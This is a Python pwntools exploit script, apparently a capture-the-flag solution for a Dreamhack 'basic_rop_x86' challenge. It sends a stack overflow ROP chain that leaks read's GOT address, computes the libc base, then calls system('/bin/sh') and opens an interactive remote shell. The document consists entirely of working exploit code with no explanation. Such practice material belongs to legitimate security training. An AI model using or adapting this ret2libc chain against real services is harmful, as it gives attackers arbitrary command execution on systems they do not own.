from pwn import *

port = 22688
rem = remote("host1.dreamhack.games", port)
elf = ELF("./Pwnable/basic_rop_x86/problem/basic_rop_x86")
lib = ELF("./Pwnable/basic_rop_x86/problem/libc.so.6")

ret = 0x080483c2
pr = 0x0804868b
pppr = 0x08048689
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
main = elf.symbols['main']

payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(main)

rem.send(payload)

rem.recvuntil(b'A' * 0x40)
read_addr = u64(rem.recvn(4) + b'\x00' * 0x4)
read_offset = lib.symbols['read']
lib_base = read_addr - read_offset
sys_offset = lib.symbols['system']
sys_addr = lib_base + sys_offset
binsh_offset = list(lib.search('/bin/sh'))[0]
binsh_addr = lib_base + binsh_offset

payload = b'A' * 0x48
payload += p32(sys_addr)
payload += p32(pr)
payload += p32(binsh_addr)
rem.send(payload)

rem.recvuntil(b'A' * 0x40)
rem.interactive()